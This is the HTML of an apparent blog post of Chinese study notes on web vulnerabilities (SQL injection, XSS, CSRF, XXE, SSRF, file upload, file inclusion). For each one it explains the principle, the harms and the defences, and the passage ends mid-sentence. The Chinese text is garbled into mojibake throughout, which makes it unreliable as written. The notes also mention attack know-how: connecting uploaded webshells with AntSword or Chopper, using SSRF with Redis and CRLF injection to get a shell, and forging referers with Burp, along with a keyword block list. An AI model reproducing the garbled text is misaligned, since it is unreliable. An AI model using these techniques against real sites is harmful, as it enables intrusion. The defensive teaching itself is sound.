href="#ä¸€ã€sqlæ¼æ´ç¯‡" class="headerlink" title="ä¸€ã€sqlæ¼æ´ç¯‡"></a>ä¸€ã€sqlæ¼æ´ç¯‡</h2><blockquote><p><a href="#%E4%B8%80%E3%80%81sql">sqlæ¼æ´çŸ¥è¯†ç‚¹è®°å½•</a></p></blockquote><h3 id="1-sqlæ¼æ´åŸç†"><a href="#1-sqlæ¼æ´åŸç†" class="headerlink" title="1.sqlæ¼æ´åŸç†"></a>1.sqlæ¼æ´åŸç†</h3><p>æŒ‡webåº”ç”¨ç¨‹åº<u><strong>å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­</strong></u>ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥<u><strong>æ„é€ ä¸åŒçš„sqlè¯­å¥æ¥å¯¹æ•°æ®åº“æ•°æ®åº“çš„æ“ä½œ</strong></u>ã€‚ï¼ˆwebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæˆ–è€…è¿‡æ»¤ä¸ä¸¥ï¼Œå°±æŠŠsqlè¯­å¥å¸¦è¿›æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼‰ã€‚</p><blockquote><p>Sqlæ³¨å…¥æ¼æ´çš„äº§ç”Ÿéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š<br>â‘ å‚æ•°ç”¨æˆ·å¯æ§ï¼š<u><strong>å‰ç«¯ä¼ ç»™åç«¯çš„å‚æ•°å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„</strong></u>ã€‚<br>â‘¡<u><strong>å‚æ•°ä»£å…¥æ•°æ®åº“æŸ¥è¯¢</strong></u>ï¼šä¼ å…¥çš„å‚æ•°æ‹¼æ¥åˆ°sqlè¯­å¥ï¼Œä¸”å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚</p></blockquote><h3 id="2-å±å®³"><a href="#2-å±å®³" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote><p>â‘ æ•°æ®åº“ä¿¡æ¯æ³„æ¼ï¼šæ•°æ®åº“ä¸­å­˜æ”¾çš„<u><strong>ç”¨æˆ·çš„éšç§ä¿¡æ¯çš„æ³„éœ²</strong></u>ã€‚<br>â‘¡ç½‘é¡µç¯¡æ”¹ï¼šé€šè¿‡æ“ä½œæ•°æ®åº“å¯¹ç‰¹å®šç½‘é¡µè¿›è¡Œç¯¡æ”¹ã€‚<br>â‘¢ç½‘ç«™è¢«æŒ‚é©¬ï¼Œä¼ æ’­æ¶æ„è½¯ä»¶ï¼š<u><strong>ä¿®æ”¹æ•°æ®åº“ä¸€äº›å­—æ®µçš„å€¼ï¼ŒåµŒå…¥ç½‘é©¬é“¾æ¥</strong></u>ï¼Œè¿›è¡ŒæŒ‚é©¬æ”»å‡»ã€‚<br>â‘£æ•°æ®åº“è¢«æ¶æ„æ“ä½œï¼šæ•°æ®åº“æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œæ•°æ®åº“çš„ç³»ç»Ÿç®¡ç†å‘˜å¸æˆ·è¢«çªœæ”¹ã€‚<br>â‘¤æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ï¼Œè¢«å®‰è£…åé—¨ã€‚ç»ç”±æ•°æ®åº“æœåŠ¡å™¨æä¾›çš„æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè®©é»‘å®¢å¾—ä»¥ä¿®æ”¹æˆ–æ§åˆ¶æ“ä½œç³»ç»Ÿã€‚<br>â‘¥ç ´åç¡¬ç›˜æ•°æ®ï¼Œç˜«ç—ªå…¨ç³»ç»Ÿã€‚</p></blockquote><h3 id="3-é˜²å¾¡"><a href="#3-é˜²å¾¡" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘ <u><strong>è¿‡æ»¤å±é™©å­—ç¬¦</strong></u>ï¼šä¾‹å¦‚ï¼Œé‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…unionã€sleepã€load_fileç­‰å…³é”®å­—ï¼Œå¦‚æœåŒ¹é…åˆ°ï¼Œåˆ™é€€å‡ºç¨‹åºã€‚<br>â‘¡ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼šä½¿ç”¨PDOé¢„ç¼–è¯‘è¯­å¥ï¼Œéœ€è¦æ³¨æ„ï¼Œä¸è¦å°†å˜é‡ç›´æ¥æ‹¼æ¥åˆ°PDOè¯­å¥ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨å ä½ç¬¦è¿›è¡Œæ•°æ®åº“çš„å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€æŸ¥è¯¢ã€‚<br>â‘¢ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ã€ä½¿ç”¨ä¸¥æ ¼çš„æ•°æ®ç±»å‹ã€‚</p></blockquote><hr><h2 id="äºŒã€xssæ¼æ´ç¯‡"><a href="#äºŒã€xssæ¼æ´ç¯‡" class="headerlink" title="äºŒã€xssæ¼æ´ç¯‡"></a>äºŒã€xssæ¼æ´ç¯‡</h2><h3 id="1-xssæ¼æ´åŸç†"><a href="#1-xssæ¼æ´åŸç†" class="headerlink" title="1.xssæ¼æ´åŸç†"></a>1.xssæ¼æ´åŸç†</h3><p>æ¶æ„æ”»å‡»è€…<u><strong>å¾€Webé¡µé¢é‡ŒåµŒå…¥è„šæœ¬ä»£ç </strong></u>ï¼ˆ<u><strong>é€šå¸¸æ˜¯JavaScriptç¼–å†™çš„æ¶æ„ä»£ç </strong></u>ï¼‰ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ï¼ˆæ¶æ„æ”»å‡»è€…<u><strong>åˆ©ç”¨ç½‘ç«™æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤æ•°æ®è¿›è¡Œè½¬ä¹‰å¤„ç†æˆ–è€…è¿‡æ»¤ä¸è¶³çš„ç¼ºç‚¹ï¼Œè¿›è€Œæ·»åŠ ä¸€äº›ä»£ç </strong></u>ï¼ŒåµŒå…¥åˆ°webé¡µé¢ä¸­å»ã€‚ï¼‰</p><h3 id="2-å±å®³-1"><a href="#2-å±å®³-1" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote><p>â‘ ç›—å–ç”¨æˆ·Cookieã€‚<br>â‘¡ä¿®æ”¹ç½‘é¡µå†…å®¹ã€‚<br>â‘¢ç½‘ç«™æŒ‚é©¬ã€‚<br>â‘£åˆ©ç”¨ç½‘ç«™é‡å®šå‘ã€‚<br>â‘¤XSSè •è™«ã€‚</p></blockquote><h3 id="3-é˜²å¾¡-1"><a href="#3-é˜²å¾¡-1" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘ è¿‡æ»¤è¾“å…¥çš„æ•°æ®ï¼šåŒ…æ‹¬â€ â€™ â€ã€â€&lt;â€ã€â€œ&lt;â€ã€â€œ&gt;â€ã€â€œonâ€ç­‰éæ³•å­—ç¬¦ã€‚<br>â‘¡å¯¹è¾“å‡ºåˆ°é¡µé¢çš„æ•°æ®è¿›è¡Œç›¸åº”çš„ç¼–ç è½¬æ¢ï¼ŒåŒ…æ‹¬htmlå®ä½“ç¼–ç ã€javascriptç¼–ç ç­‰ã€‚</p></blockquote><hr><h2 id="ä¸‰ã€csrfæ¼æ´ç¯‡"><a href="#ä¸‰ã€csrfæ¼æ´ç¯‡" class="headerlink" title="ä¸‰ã€csrfæ¼æ´ç¯‡"></a>ä¸‰ã€csrfæ¼æ´ç¯‡</h2><h3 id="1-csrfæ¼æ´åŸç†"><a href="#1-csrfæ¼æ´åŸç†" class="headerlink" title="1.csrfæ¼æ´åŸç†"></a>1.csrfæ¼æ´åŸç†</h3><p>å› ä¸ºwebåº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œå¦‚ä¿®æ”¹è´¦å·å¯†ç ã€æ·»åŠ è´¦å·ã€è½¬è´¦ç­‰ï¼Œ<u><strong>æ²¡æœ‰æ ¡éªŒè¡¨å•tokenæˆ–è€…httpè¯·æ±‚å¤´ä¸­çš„refererå€¼</strong></u>ï¼ˆå¦‚æœæ‚¨<u><strong>åœ¨ç½‘é¡µ1ï¼Œç‚¹å‡»ä¸€ä¸ªé“¾æ¥åˆ°ç½‘é¡µ2</strong></u>ï¼Œå½“æµè§ˆå™¨<u><strong>è¯·æ±‚ç½‘é¡µ2æ—¶ï¼Œç½‘é¡µ1çš„URLå°±ä¼šåŒ…å«åœ¨ Referer å¤´ä¿¡æ¯</strong></u>ä¸­ï¼‰ï¼Œä»è€Œ<u><strong>å¯¼è‡´æ¶æ„æ”»å‡»è€…åˆ©ç”¨æ™®é€šç”¨æˆ·çš„èº«ä»½ï¼ˆcookieï¼‰å®Œæˆæ”»å‡»è¡Œä¸º</strong></u>ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20210601210954715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NfcHJvZ3JhbWo=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>Csrfæ”»å‡»è¿‡ç¨‹ä¸¤ä¸ªé‡ç‚¹ï¼š</p><blockquote><p>â‘ ç›®æ ‡ç”¨æˆ·<u><strong>å·²ç»ç™»å½•äº†ç½‘ç«™</strong></u>ï¼Œ<u><strong>èƒ½å¤Ÿæ‰§è¡Œç½‘ç«™çš„åŠŸèƒ½</strong></u>ã€‚<br>â‘¡ç›®æ ‡ç”¨æˆ·<u><strong>è®¿é—®äº†æ”»å‡»è€…æ„é€ çš„URL</strong></u>ã€‚</p></blockquote><h3 id="2-å±å®³-2"><a href="#2-å±å®³-2" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote><p>â‘ ä¼ªé€ HTTPè¯·æ±‚è¿›è¡Œæœªæˆæƒæ“ä½œã€‚<br>â‘¡ç¯¡æ”¹ã€ç›—å–ç›®æ ‡ç½‘ç«™ä¸Šçš„é‡è¦ç”¨æˆ·æ•°æ®ã€‚<br>â‘¢æœªç»å…è®¸æ‰§è¡Œå¯¹ç”¨æˆ·åèª‰æˆ–è€…èµ„äº§æœ‰å®³çš„æ“ä½œï¼Œæ¯”å¦‚ï¼šæ•£æ’­ä¸è‰¯ä¿¡æ¯ã€è¿›è¡Œæ¶ˆè´¹ç­‰ã€‚<br>â‘£å¦‚æœé€šè¿‡ä½¿ç”¨ç¤¾å·¥ç­‰æ–¹å¼æ”»å‡»ç½‘ç«™ç®¡ç†å‘˜ã€ä¼šå±å®³ç½‘ç«™æœ¬èº«çš„å®‰å…¨æ€§ã€‚<br>â‘¤ä½œä¸ºå…¶ä»–æ”»å‡»å‘é‡çš„è¾…åŠ©æ”»å‡»æ‰‹æ³•ï¼Œå¿…é¡»é…åˆXSS<br>â‘¥ä¼ æ’­CSRFè •è™«</p></blockquote><h3 id="3-é˜²å¾¡-2"><a href="#3-é˜²å¾¡-2" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘ éªŒè¯è¯·æ±‚çš„<u><strong><code>referer</code></strong></u>å€¼ï¼Œå¦‚æœrefereræ˜¯ä»¥è‡ªå·±çš„ç½‘ç«™å¼€å¤´çš„åŸŸåï¼Œåˆ™è¯´æ˜è¯¥è¯·æ±‚æ¥è‡ªç½‘ç«™è‡ªå·±ï¼Œæ˜¯åˆæ³•çš„ã€‚<u><strong>å¦‚æœrefereræ˜¯å…¶ä»–ç½‘ç«™åŸŸåæˆ–ç©ºç™½ï¼Œå°±æœ‰å¯èƒ½æ˜¯csrfæ”»å‡»ï¼Œé‚£ä¹ˆæœåŠ¡å™¨æ‹’ç»è¯¥è¯·æ±‚</strong></u>ï¼Œä½†æ˜¯æ­¤æ–¹æ³•å­˜åœ¨è¢«ç»•è¿‡çš„å¯èƒ½ã€<u><strong>brupsuiteå¯ä»¥æŠ“åŒ…ä¿®æ”¹refererä»è€Œç»•è¿‡å‰ç«¯è¿‡æ»¤</strong></u>ã€‘ã€‚<br>â‘¡csrfæ”»å‡»ä¹‹æ‰€ä»¥èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸º<u><strong>æ”»å‡»è€…ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚</strong></u>ï¼Œæ‰€ä»¥æŠµå¾¡csrfçš„å…³é”®åœ¨äºï¼šåœ¨<u><strong>è¯·æ±‚ä¸­æ”¾å…¥æ”»å‡»è€…ä¸èƒ½ä¼ªé€ çš„è¯·æ±‚</strong></u>ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯<u><strong>éªŒè¯token</strong></u>ã€<u><strong>ç±»ä¼¼äºéªŒè¯ç </strong></u>ã€‘ï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰tokenæˆ–è€…tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºè¯·æ±‚å¯èƒ½æ˜¯csrfæ”»å‡»ï¼Œä»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚</p></blockquote><hr><h2 id="å››ã€xxeæ¼æ´ç¯‡"><a href="#å››ã€xxeæ¼æ´ç¯‡" class="headerlink" title="å››ã€xxeæ¼æ´ç¯‡"></a>å››ã€xxeæ¼æ´ç¯‡</h2><h3 id="1-xxeæ¼æ´åŸç†"><a href="#1-xxeæ¼æ´åŸç†" class="headerlink" title="1.xxeæ¼æ´åŸç†"></a>1.xxeæ¼æ´åŸç†</h3><p>XML å¤–éƒ¨å®ä½“æ”»å‡»æ˜¯é’ˆå¯¹è§£æ XML è¾“å…¥çš„åº”ç”¨ç¨‹åºçš„ä¸€ç§æ”»å‡»ã€‚å½“<strong>åŒ…å«å¯¹å¤–éƒ¨å®ä½“çš„å¼•ç”¨çš„ XML è¾“å…¥ç”±å¼±é…ç½®çš„ XML è§£æå™¨å¤„ç†</strong>æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æ”»å‡»ã€‚è¿™ç§æ”»å‡»å¯èƒ½å¯¼è‡´<strong>æœºå¯†æ•°æ®æ³„éœ²ã€æ‹’ç»æœåŠ¡ã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ã€ä»è§£æå™¨æ‰€åœ¨æœºå™¨çš„è§’åº¦è¿›è¡Œç«¯å£æ‰«æ</strong>ç­‰ç³»ç»Ÿå½±å“ã€‚</p><p>æ”»å‡»å¯èƒ½åŒ…æ‹¬ä½¿ç”¨ç³»ç»Ÿæ ‡è¯†ç¬¦ä¸­çš„ <code>file: æ–¹æ¡ˆæˆ–ç›¸å¯¹è·¯å¾„å…¬å¼€æœ¬åœ°æ–‡ä»¶</code>ï¼Œè¿™äº›æ–‡ä»¶<strong>å¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚å¯†ç æˆ–ç§äººç”¨æˆ·æ•°æ®</strong>ã€‚ç”±äº<strong>æ”»å‡»å‘ç”Ÿä¸å¤„ç† XML æ–‡æ¡£çš„åº”ç”¨ç¨‹åºç›¸å…³</strong>ï¼Œå› æ­¤<strong>æ”»å‡»è€…å¯èƒ½ä¼šä½¿ç”¨æ­¤å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºè½¬å‘å…¶ä»–å†…éƒ¨ç³»ç»Ÿ</strong>ï¼Œå¯èƒ½é€šè¿‡ http(s) è¯·æ±‚æ³„éœ²å…¶ä»–å†…éƒ¨å†…å®¹æˆ–<strong>å¯¹ä»»ä½•æœªå—ä¿æŠ¤çš„å†…éƒ¨æœåŠ¡å‘èµ· CSRF æ”»å‡»</strong>ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ˜“å—å®¢æˆ·ç«¯å†…å­˜æŸåé—®é¢˜å½±å“çš„ XML å¤„ç†å™¨åº“<strong>å¯èƒ½ä¼šé€šè¿‡è§£é™¤å¯¹æ¶æ„ URI çš„å¼•ç”¨è€Œè¢«åˆ©ç”¨</strong>ï¼Œ<strong>ä»è€Œå¯èƒ½å…è®¸åœ¨åº”ç”¨ç¨‹åºå¸æˆ·ä¸‹æ‰§è¡Œä»»æ„ä»£ç </strong>ã€‚å…¶ä»–æ”»å‡»å¯ä»¥è®¿é—®å¯èƒ½ä¸ä¼šåœæ­¢è¿”å›æ•°æ®çš„æœ¬åœ°èµ„æºï¼Œ</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åŒºåˆ†ä»¥ä¸‹å‡ ç§ XXE æ”»å‡»ï¼š</p><blockquote><ul><li>å…¸å‹æ³¨å…¥ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤–éƒ¨å®ä½“åŒ…å«åœ¨æœ¬åœ° DTD ä¸­</li><li>ç›²æ³¨ï¼šå“åº”ä¸­æ²¡æœ‰æ˜¾ç¤ºè¾“å‡ºå’Œ&#x2F;æˆ–é”™è¯¯</li><li>æŠ¥é”™æ³¨å…¥ï¼šå°è¯•åœ¨é”™è¯¯æ¶ˆæ¯ä¸­è·å–èµ„æºçš„å†…å®¹</li></ul></blockquote><p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬<u><strong>XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ </strong></u>ã€‚</p><h3 id="2-å±å®³-3"><a href="#2-å±å®³-3" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote><p>â‘ è¯»å–ä»»æ„æ–‡ä»¶ã€‚<br>â‘¡æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>â‘¢æ¢æµ‹å†…ç½‘ç«¯å£ã€‚<br>â‘£æ”»å‡»å†…ç½‘ç½‘ç«™ã€‚</p></blockquote><h3 id="3-é˜²å¾¡-3"><a href="#3-é˜²å¾¡-3" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘ ç¦æ­¢ä½¿ç”¨<u><strong>å¤–éƒ¨å®ä½“</strong></u>ï¼Œä¾‹å¦‚ï¼š<br>PHPï¼šlibxml_disable_entity_loader(true)<br>â‘¡è¿‡æ»¤ç”¨æˆ·æäº¤çš„xmlæ•°æ®ï¼Œé˜²æ­¢å‡ºç°éæ³•å†…å®¹ã€‚</p></blockquote><hr><h2 id="äº”ã€ssrfæ¼æ´ç¯‡"><a href="#äº”ã€ssrfæ¼æ´ç¯‡" class="headerlink" title="äº”ã€ssrfæ¼æ´ç¯‡"></a>äº”ã€ssrfæ¼æ´ç¯‡</h2><h3 id="1-ssrfæ¼æ´åŸç†"><a href="#1-ssrfæ¼æ´åŸç†" class="headerlink" title="1.ssrfæ¼æ´åŸç†"></a>1.ssrfæ¼æ´åŸç†</h3><p>å¤§éƒ½æ˜¯ç”±äº<u><strong>æœåŠ¡å™¨æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong></u>ä¸”<u><strong>æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶</strong></u><strong>ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚</strong><u><strong>åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ </strong></u>ã€‚SSRFæ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><p><img src="/2022/05/28/Web-study/image-20220802103546644.png" alt="image-20220802103546644"></p><p><img src="/2022/05/28/Web-study/image-20220802103603770.png" alt="image-20220802103603770"></p><h3 id="2-å±å®³-4"><a href="#2-å±å®³-4" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p>æ”»å‡»è€…å°±å¯ä»¥<u><strong>åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡é˜²ç«å¢™ç­‰è®¿é—®é™åˆ¶</strong></u>ï¼Œè¿›è€Œå°†å—æ„ŸæŸ“æˆ–å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†è¿›è¡Œç«¯å£æ‰«æï¼Œç”šè‡³æ˜¯è®¿é—®å†…éƒ¨ç³»ç»Ÿæ•°æ®ã€‚</p><blockquote><p>1.å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„banner ä¿¡æ¯</p><p>2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</p><p>3.å¯¹å†…ç½‘ WEB åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°(å¦‚ï¼šreadmeæ–‡ä»¶)</p><p>4.æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»(å¦‚ï¼šStruts2ï¼Œsqli)</p><p>5.ä¸‹è½½å†…ç½‘èµ„æº(å¦‚ï¼šåˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰)</p><p>6.è¿›è¡Œè·³æ¿</p><p>7.æ— è§†cdn</p><p>8.åˆ©ç”¨Redisæœªæˆæƒè®¿é—®ï¼ŒHTTP CRLFæ³¨å…¥å®ç°getshell</p></blockquote><h3 id="3-é˜²å¾¡-4"><a href="#3-é˜²å¾¡-4" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘  é™åˆ¶è¯·æ±‚çš„ç«¯å£åªèƒ½ä¸ºwebç«¯å£ï¼Œåªå…è®¸è®¿é—®HTTPå’ŒHTTPSè¯·æ±‚ã€‚<br>â‘¡ é™åˆ¶ä¸èƒ½è®¿é—®å†…ç½‘çš„IPï¼Œä»¥é˜²æ­¢å¯¹å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚<br>â‘¢ å±è”½è¿”å›çš„è¯¦ç»†ä¿¡æ¯ã€‚<br>â‘£ é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºHTTPå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80,443,8080,8088ç­‰ã€‚</p></blockquote><blockquote><p>PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</p><p>file_get_contents()</p><p>fsockopen()<br>#åœ¨PHPä¸­fsockopenå‡½æ•°çš„ä½œç”¨æ˜¯æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnixå¥—æ¥å­—è¿æ¥ï¼Œå…¶è¯­æ³•ä¸ºâ€œfsockopen($hostname) â€ï¼Œè¿”å›å€¼ä¸ºä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä¹‹åå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶ç±»å‡½æ•°è°ƒç”¨</p><p>curl_exec()</p></blockquote><hr><h2 id="å…­ã€fileuploadæ¼æ´ç¯‡"><a href="#å…­ã€fileuploadæ¼æ´ç¯‡" class="headerlink" title="å…­ã€fileuploadæ¼æ´ç¯‡"></a>å…­ã€fileuploadæ¼æ´ç¯‡</h2><h3 id="1-fileuploadæ¼æ´åŸç†"><a href="#1-fileuploadæ¼æ´åŸç†" class="headerlink" title="1.fileuploadæ¼æ´åŸç†"></a>1.fileuploadæ¼æ´åŸç†</h3><p>å°±æ˜¯æœªå¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œå¯¼è‡´æŸäº›åˆ«æœ‰ç”¨å¿ƒçš„ç”¨æˆ·ä¸Šä¼ äº†ä¸€äº›æ¶æ„ä»£ç æˆ–æ–‡ä»¶ï¼ˆ<code>aspã€phpã€jsp</code>ç­‰ï¼‰ï¼Œä»è€Œæ§åˆ¶äº†ç½‘ç«™ã€‚ï¼ˆå½“æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¦‚æœæœåŠ¡ç«¯çš„è„šæœ¬è¯­è¨€æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œé‚£å‡å¦‚ï¼Œæ¸—é€è€…ç›´æ¥ä¸Šä¼ æ¶æ„ä»£ç æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ç›´æ¥æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œæˆ–è€…è¯´ä»¥æ­¤ä¸ºè·³æ¿ï¼Œç›´æ¥æ‹¿ä¸‹æœåŠ¡å™¨ï¼Œè¿™å°±æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ï¼‰</p><h3 id="2-å±å®³-5"><a href="#2-å±å®³-5" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p><u><strong>éæ³•ç”¨æˆ·å¯ä»¥åˆ©ç”¨æ¶æ„è„šæœ¬æ–‡ä»¶æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œç”šè‡³æ§åˆ¶æœåŠ¡å™¨</strong></u>ã€‚è¿™ä¸ªæ¶æ„è„šæœ¬æ–‡ä»¶ï¼Œåˆç§°ä¸ºwebshellï¼Œä¹Ÿå¯å°†webshellè„šæœ¬ç§°ä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼Œwebshellè„šæœ¬å…·æœ‰å¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œ<u><strong>æ¯”å¦‚æŸ¥çœ‹æœåŠ¡å™¨ç›®å½•ã€æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ï¼Œæ‰§è¡Œç»•è¿‡å‘½ä»¤ç­‰ã€‚</strong></u>ã€<strong>ç”¨èšå‰‘æˆ–èœåˆ€è¿æ¥ä¸Šä¼ çš„ phpæ–‡ä»¶ï¼Œè¾“å…¥æ–‡ä»¶ä¸­çš„å¯†ç </strong>ã€‘</p><h3 id="3-é˜²å¾¡-5"><a href="#3-é˜²å¾¡-5" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote><p>â‘ é€šè¿‡ç™½åå•æ–¹å¼åˆ¤æ–­æ–‡ä»¶åç¼€æ˜¯å¦åˆæ³•ã€‚<br>â‘¡å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚</p></blockquote><hr><h2 id="ä¸ƒã€fileincludeæ¼æ´ç¯‡"><a href="#ä¸ƒã€fileincludeæ¼æ´ç¯‡" class="headerlink" title="ä¸ƒã€fileincludeæ¼æ´ç¯‡"></a>ä¸ƒã€fileincludeæ¼æ´ç¯‡</h2><blockquote><p><a href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">æ–‡ä»¶åŒ…å«æ¼æ´çŸ¥è¯†ç‚¹è®°å½•</a></p></blockquote><h3 id="1-fileincludeæ¼æ´åŸç†"><a href="#1-fileincludeæ¼æ´åŸç†" class="headerlink" title="1.fileincludeæ¼æ´åŸç†"></a>1.fileincludeæ¼æ´åŸç†</h3><p>å¼€å‘äººå‘˜å°†<u><strong>éœ€è¦é‡å¤è°ƒç”¨çš„å‡½æ•°å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå¯¹è¯¥æ–‡ä»¶è¿›è¡ŒåŒ…å«æ˜¯äº§ç”Ÿçš„æ“ä½œ</strong></u>ã€‚è¿™æ ·ç¼–å†™ä»£ç èƒ½å‡å°‘ä»£ç å†—ä½™ï¼Œé™ä½ä»£ç åæœŸç»´æŠ¤éš¾åº¦ï¼Œä¿è¯ç½‘ç«™æ•´ä½“é£æ ¼ç»Ÿä¸€ï¼šå¯¼èˆªæ ã€åº•éƒ¨footeræ ç­‰ã€‚<u><strong>æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–ä¸¥æ 